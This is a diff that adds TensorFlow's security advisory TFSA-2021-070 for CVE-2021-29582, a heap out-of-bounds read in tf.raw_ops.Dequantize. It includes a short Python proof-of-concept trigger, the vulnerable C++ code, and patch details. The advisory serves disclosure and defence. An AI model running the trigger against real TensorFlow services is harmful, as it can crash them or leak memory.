@@ -1,0 +1,59 @@
+<h2>TFSA-2021-070: Heap OOB read in <code>tf.raw_ops.Dequantize</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-29582</p>
+<h3>Impact</h3>
+<p>Due to lack of validation in <code>tf.raw_ops.Dequantize</code>, an attacker can
+trigger a read from outside of bounds of heap allocated data:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>input_tensor=tf.constant(
+    [75, 75, 75, 75, -6, -9, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10,\
+  -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10,\
+  -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10,\
+  -10, -10, -10, -10], shape=[5, 10], dtype=tf.int32)
+input_tensor=tf.cast(input_tensor, dtype=tf.quint8)
+min_range = tf.constant([-10], shape=[1], dtype=tf.float32)
+max_range = tf.constant([24, 758, 758, 758, 758], shape=[5], dtype=tf.float32)</p>
+<p>tf.raw_ops.Dequantize(
+    input=input_tensor,
+    min_range=min_range,
+    max_range=max_range,
+    mode='SCALED',
+    narrow_range=True,
+    axis=0,
+    dtype=tf.dtypes.float32)
+```</p>
+<p>The
+<a href="https://github.com/tensorflow/tensorflow/blob/26003593aa94b1742f34dc22ce88a1e17776a67d/tensorflow/core/kernels/dequantize_op.cc#L106-L131">implementation</a>
+accesses the <code>min_range</code> and <code>max_range</code> tensors in parallel but fails to check
+that they have the same shape:</p>
+<p><code>cc
+if (num_slices == 1) {
+  const float min_range = input_min_tensor.flat&lt;float&gt;()(0);
+  const float max_range = input_max_tensor.flat&lt;float&gt;()(0);
+  DequantizeTensor(ctx, input, min_range, max_range, &amp;float_output);
+} else {
+  ...
+  auto min_ranges = input_min_tensor.vec&lt;float&gt;();
+  auto max_ranges = input_max_tensor.vec&lt;float&gt;();
+  for (int i = 0; i &lt; num_slices; ++i) {
+    DequantizeSlice(ctx-&gt;eigen_device&lt;Device&gt;(), ctx,
+                    input_tensor.template chip&lt;1&gt;(i), min_ranges(i),
+                    max_ranges(i), output_tensor.template chip&lt;1&gt;(i));
+    ...
+  }
+}</code></p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/5899741d0421391ca878da47907b1452f06aaf1b">5899741d0421391ca878da47907b1452f06aaf1b</a>.</p>
+<p>The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
+commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
+2.1.4, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security
+guide</a> for
+more information regarding the security model and how to contact us with issues
+and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu
+X-Team.</p>
